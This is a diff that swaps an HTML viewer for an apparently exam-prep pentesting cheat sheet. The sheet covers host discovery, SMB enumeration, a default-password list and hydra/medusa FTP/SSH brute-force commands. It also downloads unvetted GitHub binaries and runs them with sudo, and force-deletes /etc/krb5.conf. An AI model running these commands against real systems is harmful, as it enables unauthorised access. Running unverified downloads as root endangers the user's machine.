@@ -1,362 +1,2703 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSCP Master Cheat Sheet</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <style>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Pentesting  Cheat Sheet</title><style>
+        /* cspell:disable-file */
+        html {
+            -webkit-print-color-adjust: exact;
+        }
         * {
+            box-sizing: border-box;
+            -webkit-print-color-adjust: exact;
+        }
+
+        html,
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
             background: #1e1e1e;
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             color: #d4d4d4;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
+            font-family: 'Courier New', monospace;
             line-height: 1.5;
+            font-size: 14px;
+        }
+        @media only screen {
+            body {
+                margin: 2em auto;
+                max-width: 900px;
+                padding: 0 1rem;
+            }
         }
 
-        #sidebar {
-            width: 310px;
-            background: #252526;
-            border-right: 1px solid #3e3e42;
-            display: flex;
-            flex-direction: column;
-            padding: 20px 12px 20px 16px;
-            z-index: 10;
-            flex-shrink: 0;
-            overflow-y: auto;
-            height: 100vh;
-        }
-
-        /* Custom scrollbar for sidebar */
-        #sidebar::-webkit-scrollbar {
-            width: 6px;
-        }
-        #sidebar::-webkit-scrollbar-track {
-            background: #1e1e1e;
-            border-radius: 3px;
-        }
-        #sidebar::-webkit-scrollbar-thumb {
-            background: #4e4e52;
-            border-radius: 3px;
-        }
-        #sidebar::-webkit-scrollbar-thumb:hover {
-            background: #6e6e72;
-        }
-
-        .cyber-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
+        a,
+        a.visited {
             color: #569cd6;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #569cd6;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-shrink: 0;
-        }
-        .cyber-title span {
-            font-size: 0.65rem;
-            background: #264f78;
-            padding: 2px 8px;
-            border-radius: 30px;
-            color: #9cdcfe;
+            text-decoration: underline;
         }
 
-        #buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-            flex: 1;
+        .pdf-relative-link-path {
+            font-size: 80%;
+            color: #6a9955;
         }
 
-        .cyber-btn {
-            width: 100%;
-            background: transparent;
-            border: none;
-            color: #d4d4d4;
-            padding: 8px 10px;
-            text-align: left;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            font-size: 0.8rem;
-            font-weight: 500;
-            border-radius: 6px;
-            transition: all 0.15s;
-            white-space: normal;
-            word-break: break-word;
-            line-height: 1.3;
-        }
-        .cyber-btn:hover {
-            background: #2d2d30;
-            color: white;
-        }
-        .cyber-btn.active {
-            background: #264f78;
-            color: white;
-            border-left: 3px solid #4ec9b0;
-            border-radius: 6px;
+        h1,
+        h2,
+        h3 {
+            letter-spacing: -0.01em;
+            line-height: 1.2;
+            font-weight: 600;
+            margin-bottom: 0;
         }
 
-        #content-wrapper {
-            flex: 1;
-            overflow-y: auto;
-            padding: 24px 32px;
-            background: #1e1e1e;
-            scroll-behavior: smooth;
-        }
-        #content-wrapper::-webkit-scrollbar {
-            width: 8px;
-        }
-        #content-wrapper::-webkit-scrollbar-track {
-            background: #252526;
-        }
-        #content-wrapper::-webkit-scrollbar-thumb {
-            background: #424242;
-            border-radius: 8px;
+        h1 strong,
+        h2 strong,
+        h3 strong {
+            font-weight: 600;
         }
 
-        .main-header {
-            font-size: 1.6rem;
+        .page-title {
+            font-size: 2.5rem;
             font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 0.75em;
             color: #569cd6;
-            margin-bottom: 20px;
             border-left: 5px solid #4ec9b0;
             padding-left: 18px;
-            letter-spacing: -0.3px;
         }
 
-        .sub-header {
-            font-size: 1.2rem;
-            font-weight: 600;
+        h1 {
+            font-size: 1.875rem;
+            margin-top: 1.875rem;
             color: #dcdcaa;
-            margin-top: 28px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-family: 'JetBrains Mono', monospace;
-        }
-        .sub-header::before {
-            content: "❯";
-            font-size: 1.1rem;
-            color: #4ec9b0;
         }
 
-        .note-command {
+        /* H2 headings - like "Host Discovery" */
+        h2 {
+            font-size: 1.5rem;
+            margin-top: 1.5rem;
+            color: #4ec9b0;
+            border-bottom: 2px solid #4ec9b0;
+            padding-bottom: 6px;
+        }
+
+        h3 {
+            font-size: 1.25rem;
+            margin-top: 1.25rem;
+            color: #dcdcaa;
+        }
+
+        .source {
+            border: 1px solid #3e3e42;
+            border-radius: 3px;
+            padding: 1.5em;
+            word-break: break-all;
+            background: #252526;
+        }
+
+        .callout {
+            border-radius: 10px;
+            padding: 1rem;
             background: #252526;
             border-left: 4px solid #4ec9b0;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            font-family: 'JetBrains Mono', 'Fira Code', monospace;
-            font-size: 0.8rem;
-            color: #9cdcfe;
-            cursor: pointer;
-            transition: all 0.2s;
-            border-radius: 8px;
+        }
+
+        figure {
+            margin: 1.25em 0;
+            page-break-inside: avoid;
+        }
+
+        figcaption {
+            opacity: 0.5;
+            font-size: 85%;
+            margin-top: 0.5em;
+            color: #6a9955;
+        }
+
+        mark {
+            background-color: transparent;
+        }
+
+        .indented {
+            padding-left: 1.5em;
+        }
+
+        hr {
+            background: transparent;
+            display: block;
+            width: 100%;
+            height: 1px;
+            visibility: visible;
+            border: none;
+            border-bottom: 1px solid #3e3e42;
+        }
+
+        img {
+            max-width: 100%;
+        }
+
+        @media only print {
+            img {
+                max-height: 100vh;
+                object-fit: contain;
+            }
+            table.collection-content {
+                width: 100%;
+                table-layout: fixed;
+            }
+            table.collection-content th,
+            table.collection-content td {
+                overflow-wrap: anywhere;
+            }
+            table.collection-content td > .user,
+            table.collection-content td > time {
+                white-space: pre-wrap;
+            }
+        }
+
+        @page {
+            margin: 1in;
+        }
+
+        .collection-content-wrapper {
+            overflow-x: auto;
+        }
+
+        @media only print {
+            .collection-content-wrapper {
+                overflow-x: visible;
+            }
+        }
+
+        .collection-content {
+            font-size: 0.875rem;
+        }
+
+        .collection-content td {
             white-space: pre-wrap;
             word-break: break-word;
-            line-height: 1.5;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
-            position: relative;
-        }
-        .note-command:hover {
-            background: #2d2d30;
-            border-left-color: #569cd6;
-            transform: translateX(2px);
-        }
-        .note-command::after {
-            content: "";
-            position: absolute;
-            right: 14px;
-            bottom: 6px;
-            font-size: 0.6rem;
-            color: #6a9955;
-            font-family: 'Inter', monospace;
-            opacity: 0.6;
         }
 
-        #toast {
-            position: fixed;
-            bottom: 28px;
-            right: 32px;
-            background: #264f78;
-            color: white;
-            padding: 8px 18px;
-            border-radius: 40px;
-            font-size: 0.8rem;
-            font-weight: 500;
-            backdrop-filter: blur(8px);
-            display: none;
-            z-index: 1100;
-            border-left: 3px solid #4ec9b0;
-            font-family: 'JetBrains Mono', monospace;
-        }
-        .show {
-            display: block !important;
-            animation: fadeSlide 0.22s ease-out;
-        }
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
+        .column-list {
+            display: flex;
+            gap: 46px;
         }
 
-        .empty-state {
-            color: #858585;
-            text-align: center;
-            margin-top: 15vh;
-            font-size: 1rem;
-            font-family: 'Inter', monospace;
-            background: #252526;
-            padding: 42px;
-            border-radius: 8px;
-            border: 1px dashed #3e3e42;
+        .column {
+            min-width: 0;
+            overflow: hidden;
         }
 
-        .cyber-footer {
-            margin-top: 40px;
-            padding-top: 16px;
-            font-size: 0.7rem;
-            color: #6a9955;
-            text-align: center;
-            border-top: 1px solid #3e3e42;
-            font-family: 'JetBrains Mono', monospace;
+        .column > *:first-child {
+            margin-top: 0;
+        }
+
+        .table_of_contents-item {
+            display: block;
+            font-size: 0.875rem;
+            line-height: 1.3;
+            padding: 0.125rem;
+            color: #d4d4d4;
+        }
+
+        .table_of_contents-indent-1 {
+            margin-left: 1.5rem;
+        }
+
+        .table_of_contents-indent-2 {
+            margin-left: 3rem;
+        }
+
+        .table_of_contents-indent-3 {
+            margin-left: 4.5rem;
+        }
+
+        .table_of_contents-link {
+            text-decoration: none;
+            opacity: 0.7;
+            border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+            color: #9cdcfe;
+        }
+
+        table,
+        th,
+        td {
+            border: 1px solid #3e3e42;
         }
 
         table {
-            width: 100%;
             border-collapse: collapse;
-            margin: 12px 0;
+            border-left: none;
+            border-right: none;
             background: #252526;
-            border-radius: 6px;
-            overflow: hidden;
         }
-        th {
-            background: #264f78;
-            color: #9cdcfe;
-            padding: 8px 12px;
-            text-align: left;
-            font-weight: 600;
-        }
+
+        th,
         td {
-            padding: 6px 12px;
-            border-bottom: 1px solid #3e3e42;
+            font-weight: normal;
+            padding: 0.25em 0.5em;
+            line-height: 1.5;
+            min-height: 1.5em;
+            text-align: left;
+        }
+
+        th {
+            color: #9cdcfe;
+            background: #264f78;
+        }
+
+        td {
             color: #ce9178;
         }
-        .comment { color: #6a9955; }
-        .phase {
-            background: #1a2d3e;
-            border-left: 4px solid #569cd6;
-            padding: 8px;
-            margin: 8px 0;
+
+        ol,
+        ul {
+            margin: 0;
+            margin-block-start: 0.6em;
+            margin-block-end: 0.6em;
+        }
+
+        li > ol:first-child,
+        li > ul:first-child {
+            margin-block-start: 0.6em;
+        }
+
+        ul > li {
+            list-style: disc;
+            color: #d4d4d4;
+        }
+
+        ul.to-do-list {
+            padding-inline-start: 0;
+        }
+
+        ul.to-do-list > li {
+            list-style: none;
+        }
+
+        .to-do-children-checked {
+            text-decoration: line-through;
+            opacity: 0.375;
+        }
+
+        ul.toggle > li {
+            list-style: none;
+        }
+
+        ul {
+            padding-inline-start: 1.7em;
+        }
+
+        ul > li {
+            padding-left: 0.1em;
+        }
+
+        ol {
+            padding-inline-start: 1.6em;
+        }
+
+        ol.numbered-list.numbered-list-digits-2 {
+            padding-inline-start: 2em;
+        }
+
+        ol.numbered-list.numbered-list-digits-3plus {
+            padding-inline-start: 2.4em;
+        }
+
+        ol > li {
+            padding-left: 0.2em;
+            color: #d4d4d4;
+        }
+
+        .mono ol {
+            padding-inline-start: 2em;
+        }
+
+        .mono ol > li {
+            text-indent: -0.4em;
+        }
+
+        .toggle {
+            padding-inline-start: 0em;
+            list-style-type: none;
+        }
+
+        .toggle > li > details {
+            padding-left: 1.7em;
+        }
+
+        .toggle > li > details > summary {
+            margin-left: -1.1em;
+        }
+
+        .selected-value {
+            display: inline-block;
+            padding: 0 0.5em;
+            background: rgba(206, 205, 202, 0.5);
+            border-radius: 3px;
+            margin-right: 0.5em;
+            margin-top: 0.3em;
+            margin-bottom: 0.3em;
+            white-space: nowrap;
+        }
+
+        .collection-title {
+            display: inline-block;
+            margin-right: 1em;
+        }
+
+        .page-description {
+            margin-bottom: 2em;
+            color: #858585;
+        }
+
+        .simple-table {
+            margin-top: 1em;
+            font-size: 0.875rem;
+            empty-cells: show;
+        }
+        .simple-table td {
+            height: 29px;
+            min-width: 120px;
+        }
+
+        .simple-table th {
+            height: 29px;
+            min-width: 120px;
+        }
+
+        .simple-table-header-color {
+            background: #264f78;
+            color: #9cdcfe;
+        }
+        .simple-table-header {
+            font-weight: 500;
+        }
+
+        time {
+            opacity: 0.5;
+        }
+
+        .icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 1.2em;
+            max-height: 1.2em;
+            text-decoration: none;
+            vertical-align: text-bottom;
+            margin-right: 0.5em;
+        }
+
+        img.icon {
+            border-radius: 3px;
+        }
+
+        .callout img.notion-static-icon {
+            width: 1em;
+            height: 1em;
+        }
+
+        .callout p {
+            margin: 0;
+        }
+
+        .callout h1,
+        .callout h2,
+        .callout h3 {
+            margin: 0 0 0.6rem;
+        }
+
+        .user-icon {
+            width: 1.5em;
+            height: 1.5em;
+            border-radius: 100%;
+            margin-right: 0.5rem;
+        }
+
+        .user-icon-inner {
+            font-size: 0.8em;
+        }
+
+        .text-icon {
+            border: 1px solid #000;
+            text-align: center;
+        }
+
+        .page-cover-image {
+            display: block;
+            object-fit: cover;
+            width: 100%;
+            max-height: 30vh;
+        }
+
+        .page-header-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .page-header-icon-with-cover {
+            margin-top: -0.72em;
+            margin-left: 0.07em;
+        }
+
+        .page-header-icon img {
+            border-radius: 3px;
+        }
+
+        .link-to-page {
+            margin: 1em 0;
+            padding: 0;
+            border: none;
+            font-weight: 500;
+        }
+
+        p > .user {
+            opacity: 0.5;
+        }
+
+        td > .user,
+        td > time {
+            white-space: nowrap;
+        }
+
+        input[type="checkbox"] {
+            transform: scale(1.5);
+            margin-right: 0.6em;
+            vertical-align: middle;
+        }
+
+        p {
+            margin-top: 0.5em;
+            margin-bottom: 0.5em;
+            color: #d4d4d4;
+        }
+
+        .image {
+            border: none;
+            margin: 1.5em 0;
+            padding: 0;
+            border-radius: 0;
+            text-align: center;
+        }
+
+        /* ----- CODE BLOCKS ----- */
+        .code,
+        code {
+            background: #1e1e1e !important;
             border-radius: 4px;
+            padding: 0.15em 0.4em;
+            font-size: 87%;
+            tab-size: 2;
+            color: #d4d4d4 !important;
+            font-family: 'Courier New', monospace;
         }
-    </style>
-</head>
-<body>
 
-<nav id="sidebar">
-    <div class="cyber-title">
-        🤖XNG🤖 <span>☠️1337☠️</span>
-    </div>
-    <div id="buttons"></div>
-    <div style="margin-top: 16px; font-size:0.65rem; text-align:center; color:#6a9955; flex-shrink: 0;"></div>
-</nav>
-
-<main id="content-wrapper">
-    <div id="note">
-        <div class="empty-state">⎯  SELECT A MODULE FROM THE SIDEBAR  ⎯</div>
-    </div>
-    <footer class="cyber-footer">
-        
-    </footer>
-</main>
-
-<div id="toast">✓ command copied</div>
-
-<script>
-    let notesData = [];
-    let currentNote = null;
-
-    function decodeBase64(str) {
-        try {
-            return decodeURIComponent(escape(atob(str)));
-        } catch (e) {
-            try { return atob(str); } catch (err) { return str; }
+        code {
+            color: #d4d4d4 !important;
+            background: #1e1e1e !important;
         }
-    }
 
-    fetch('notes.json?v=' + Date.now())
-        .then(res => res.json())
-        .then(data => {
-            notesData = data;
-            generateButtons(data);
-        })
-        .catch(err => {
-            console.error("Error loading notes.json:", err);
-            document.getElementById('note').innerHTML = `<div class="empty-state">⚠️ Could not load notes.json. Make sure the file exists in the same directory.</div>`;
-        });
+        .code {
+            padding: 1.2em 1.2em;
+            border-left: 4px solid #4ec9b0;
+            margin-bottom: 16px;
+            border-radius: 6px;
+            background: #1e1e1e !important;
+            overflow-x: auto;
+        }
 
-    function generateButtons(data) {
-        const buttonDiv = document.getElementById('buttons');
-        buttonDiv.innerHTML = '';
-        data.forEach((note, index) => {
-            const btn = document.createElement('button');
-            btn.className = 'cyber-btn';
-            btn.innerText = note.button_name;
-            btn.onclick = (e) => {
-                document.querySelectorAll('.cyber-btn').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                showNote(note);
-            };
-            buttonDiv.appendChild(btn);
-        });
-        if (data.length) showNote(data[0]);
-    }
+        .code-wrap {
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
 
-    function showNote(note) {
-        currentNote = note;
-        renderView(note.contents, note.note_header);
-    }
+        .code > code {
+            background: none !important;
+            padding: 0;
+            font-size: 100%;
+            color: #d4d4d4 !important;
+        }
 
-    function renderView(contents, header) {
-        const noteDiv = document.getElementById('note');
-        let html = `<h2 class='main-header'>${escapeHTML(header || 'MODULE')}</h2>`;
-        
-        contents.forEach(section => {
-            const decodedCmd = decodeBase64(section.content);
-            const subHeader = section.sub_header || '';
-            html += `
-                <h3 class='sub-header'>${escapeHTML(subHeader)}</h3>
-                <div class='note-command' onclick='copyToClipboard(this)'>${escapeHTML(decodedCmd)}</div>`;
-        });
-        
-        noteDiv.innerHTML = html;
-    }
+        pre {
+            background: #1e1e1e !important;
+            border-radius: 6px;
+            padding: 1.2em 1.2em;
+            border-left: 4px solid #4ec9b0;
+            margin-bottom: 16px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #d4d4d4;
+        }
 
-    function copyToClipboard(el) {
-        let text = el.innerText.replace('', '').trim();
-        navigator.clipboard.writeText(text).then(() => {
-            const toast = document.getElementById('toast');
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 1800);
-        });
-    }
+        .code code,
+        pre code,
+        pre[class*="language-"] code,
+        code[class*="language-"] {
+            color: #d4d4d4 !important;
+            font-size: 14px !important;
+            line-height: 1.5;
+            font-weight: 400;
+            font-family: 'Courier New', monospace !important;
+        }
 
-    function escapeHTML(str) {
-        return str.replace(/[&<>]/g, m => ({
-            '&': '&amp;', '<': '&lt;', '>': '&gt;'
-        })[m]);
+        pre[class*="language-"] {
+            background: #1e1e1e !important;
+            border-radius: 6px;
+            padding: 1.2em 1.2em;
+            border-left: 4px solid #4ec9b0;
+            margin-bottom: 16px;
+        }
+
+        /* ----- SYNTAX HIGHLIGHTING FOR COMMENTS ----- */
+        /* Comments like "# Ping sweep" and "# SMB discovery" */
+        .token.comment,
+        .token.prolog,
+        .token.doctype,
+        .token.cdata,
+        .hljs-comment,
+        .hljs-meta {
+            color: #6a9955 !important;
+            font-style: normal;
+        }
+
+        /* Regular code text */
+        .token.punctuation,
+        .hljs-punctuation {
+            color: #d4d4d4 !important;
+        }
+
+        .token.property,
+        .token.tag,
+        .token.boolean,
+        .token.number,
+        .token.constant,
+        .token.symbol,
+        .token.deleted {
+            color: #b5cea8 !important;
+        }
+
+        .token.selector,
+        .token.attr-name,
+        .token.string,
+        .token.char,
+        .token.builtin,
+        .token.inserted {
+            color: #ce9178 !important;
+        }
+
+        .token.operator,
+        .token.entity,
+        .token.url,
+        .language-css .token.string,
+        .style .token.string {
+            color: #d4d4d4 !important;
+        }
+
+        .token.atrule,
+        .token.attr-value,
+        .token.keyword {
+            color: #569cd6 !important;
+        }
+
+        .token.function,
+        .token.class-name {
+            color: #dcdcaa !important;
+        }
+
+        .token.regex,
+        .token.important,
+        .token.variable {
+            color: #d16969 !important;
+        }
+
+        blockquote {
+            font-size: 1em;
+            margin: 1em 0;
+            padding-left: 1em;
+            border-left: 3px solid #4ec9b0;
+            color: #d4d4d4;
+        }
+
+        blockquote.quote-large {
+            font-size: 1.25em;
+        }
+
+        .bookmark {
+            text-decoration: none;
+            max-height: 8em;
+            padding: 0;
+            display: flex;
+            width: 100%;
+            align-items: stretch;
+            background: #252526;
+            border-radius: 8px;
+        }
+
+        .bookmark-title {
+            font-size: 0.85em;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            height: 1.75em;
+            white-space: nowrap;
+            color: #569cd6;
+        }
+
+        .bookmark-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bookmark-info {
+            flex: 4 1 180px;
+            padding: 12px 14px 14px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .bookmark-image {
+            width: 33%;
+            flex: 1 1 180px;
+            display: block;
+            position: relative;
+            object-fit: cover;
+            border-radius: 1px;
+        }
+
+        .bookmark-description {
+            color: #858585;
+            font-size: 0.75em;
+            overflow: hidden;
+            max-height: 4.5em;
+            word-break: break-word;
+        }
+
+        .bookmark-href {
+            font-size: 0.75em;
+            margin-top: 0.25em;
+            color: #6a9955;
+        }
+
+        .sans { font-family: 'Courier New', monospace; }
+        .code { font-family: 'Courier New', monospace; }
+        .serif { font-family: 'Courier New', monospace; }
+        .mono { font-family: 'Courier New', monospace; }
+
+        .highlight-default { color: #d4d4d4; }
+        .highlight-gray { color: #858585; fill: #858585; }
+        .highlight-brown { color: #ce9178; fill: #ce9178; }
+        .highlight-orange { color: #d4a24c; fill: #d4a24c; }
+        .highlight-yellow { color: #dcdcaa; fill: #dcdcaa; }
+        .highlight-teal { color: #4ec9b0; fill: #4ec9b0; }
+        .highlight-blue { color: #569cd6; fill: #569cd6; }
+        .highlight-purple { color: #b57bcf; fill: #b57bcf; }
+        .highlight-pink { color: #d98cb3; fill: #d98cb3; }
+        .highlight-red { color: #ce9178; fill: #ce9178; }
+
+        .highlight-default_background { color: #d4d4d4; }
+        .highlight-gray_background { background: #2d2d30; }
+        .highlight-brown_background { background: #2d1f1a; }
+        .highlight-orange_background { background: #3d281a; }
+        .highlight-yellow_background { background: #3d3a1a; }
+        .highlight-teal_background { background: #1a2d28; }
+        .highlight-blue_background { background: #1a2d3e; }
+        .highlight-purple_background { background: #2a1a3e; }
+        .highlight-pink_background { background: #3d1a2d; }
+        .highlight-red_background { background: #3d1a1a; }
+
+        .block-color-default { color: inherit; fill: inherit; }
+        .block-color-gray { color: #858585; fill: #858585; }
+        .block-color-brown { color: #ce9178; fill: #ce9178; }
+        .block-color-orange { color: #d4a24c; fill: #d4a24c; }
+        .block-color-yellow { color: #dcdcaa; fill: #dcdcaa; }
+        .block-color-teal { color: #4ec9b0; fill: #4ec9b0; }
+        .block-color-blue { color: #569cd6; fill: #569cd6; }
+        .block-color-purple { color: #b57bcf; fill: #b57bcf; }
+        .block-color-pink { color: #d98cb3; fill: #d98cb3; }
+        .block-color-red { color: #ce9178; fill: #ce9178; }
+
+        .block-color-default_background { color: inherit; fill: inherit; }
+        .block-color-gray_background { background: #2d2d30; }
+        .block-color-brown_background { background: #2d1f1a; }
+        .block-color-orange_background { background: #3d281a; }
+        .block-color-yellow_background { background: #3d3a1a; }
+        .block-color-teal_background { background: #1a2d28; }
+        .block-color-blue_background { background: #1a2d3e; }
+        .block-color-purple_background { background: #2a1a3e; }
+        .block-color-pink_background { background: #3d1a2d; }
+        .block-color-red_background { background: #3d1a1a; }
+
+        .select-value-color-default { background-color: #2d2d30; }
+        .select-value-color-gray { background-color: #3d3d3d; }
+        .select-value-color-brown { background-color: #3d2a1a; }
+        .select-value-color-orange { background-color: #4d3a1a; }
+        .select-value-color-green { background-color: #1a3d2a; }
+        .select-value-color-blue { background-color: #1a2d4d; }
+        .select-value-color-purple { background-color: #2a1a4d; }
+        .select-value-color-pink { background-color: #4d1a2d; }
+        .select-value-color-red { background-color: #4d1a1a; }
+
+        .checkbox {
+            display: inline-flex;
+            vertical-align: text-bottom;
+            width: 16px;
+            height: 16px;
+            background-size: 16px;
+            margin-left: 2px;
+            margin-right: 5px;
+        }
+
+        .checkbox-on {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%2258A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+        }
+
+        .checkbox-off {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+        }
+</style></head><body><article id="384a083f-29df-80fd-afa3-d9b9f3ff44d4" class="page sans"><header><h1 class="page-title" dir="auto"><strong>Pentesting </strong> Cheat Sheet</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><hr id="384a083f-29df-80cc-bb16-cb3f7a59e338"/></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80a0-a9ca-cea04d61a571"/></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8041-bec5-f0e5030a08b6" class="">Host Discovery</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="384a083f-29df-8050-a956-eb7edd00422c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Ping sweep
+fping -asgq 172.16.8.0/24
+
+# SMB discovery
+nxc smb 172.16.139.0/24
+
+smbmap -H 10.129.102.152
+
+enum4linux -a 10.10.158.156</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80e9-8aad-f93f5b4f2c18" class="">Nmap Scanning</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80dc-b8aa-f8ad77ef1a7c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">for i in $(seq 1 254); do ping &quot;172.16.115.$i&quot; -c 1 -W 0.1|grep &quot;icmp_seq=1&quot;|cut -f4 -d &#x27; &#x27;|tr &#x27;:&#x27; &#x27; &#x27;; done
+
+
+wget https://github.com/boboaung1337/exe/raw/refs/heads/main/scanner &amp;&amp; sudo mv scanner /usr/bin/scanner &amp;&amp; sudo chmod +x /usr/bin/scanner
+
+sudo scanner
+
+wget https://github.com/boboaung1337/fixtime/raw/refs/heads/main/fixtime &amp;&amp; sudo mv fixtime /usr/bin/fixtime &amp;&amp; sudo chmod +x /usr/bin/fixtime
+
+sudo fixtime -i 10.10.10.10 --force
+
+# SSL/TLS info
+openssl s_client -connect $target:443
+openssl s_client -connect $target:443 -servername $target
+
+# Generate hosts file from SMB
+nxc smb &lt;IP&gt; --generate-hosts-file /tmp/hosts.tmp &amp;&amp; sudo tee -a /etc/hosts &lt; /tmp/hosts.tmp &amp;&amp; rm -rf /tmp/hosts.tmp
+
+sudo rm -rf /etc/krb5.conf
+
+# Generate krb5.conf
+nxc smb &lt;IP&gt; --generate-krb5-file /tmp/krb5.tmp &amp;&amp; sudo tee -a /etc/krb5.conf &lt; /tmp/krb5.tmp &amp;&amp; rm -rf /tmp/krb5.tmp
+</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80cd-9ba0-f8d702a54c7b"/></div><div style="display:contents" dir="auto"><p id="385a083f-29df-803a-9f73-fe72aa3dae43" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="385a083f-29df-8072-807b-db0ca598a6fd" class=""><br/>• Some default passwords to always try out!</h2></div><div style="display:contents" dir="auto"><pre id="385a083f-29df-80b4-a6e0-c8058f63f1a1" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">password
+password1
+Password1
+Password@123
+password@123
+admin
+administrator
+admin@123</code></pre></div><div style="display:contents" dir="auto"><h2 id="385a083f-29df-8034-ba9a-fd2d1211a0f5" class="">FTP</h2></div><div style="display:contents" dir="auto"><pre id="385a083f-29df-8037-b077-e6b6c845231a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">
+
+medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt
+
+ftp ftp://ftpuser:&lt;FTPUSER_PASSWORD&gt;@localhost
+
+hydra -l ftpuser -P 2020-200_most_used_passwords.txt  -s 35078 ssh://94.237.123.126
+
+
+ftp&gt; status
+ftp&gt; debug
+ftp&gt; trace
+ftp&gt; ls
+ftp&gt; ls -R
+
+wget -m --no-passive ftp://anonymous:anonymous@10.129.102.152
+
+exploits for vsFTPd 3.0.3
+
+https://www.exploit-db.com/exploits/49719
+
+binary
+prompt off
+mget *
+passive
+
+# Check PDF authors
+exiftool *.pdf | grep Author
+# Authors: Cassie, Mark, Robert
+
+# FTP brute force
+hydra -L users.txt -P users.txt &lt;ftp://192.168.135.157&gt; -t 50
+# Found cassie:cassie
+
+# Default SSH credentials for IoT/embedded devices
+/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
+
+# Router/default passwords
+/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
+
+# Common IoT credentials
+/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+
+# Top 100 usernames
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+
+# Common usernames
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
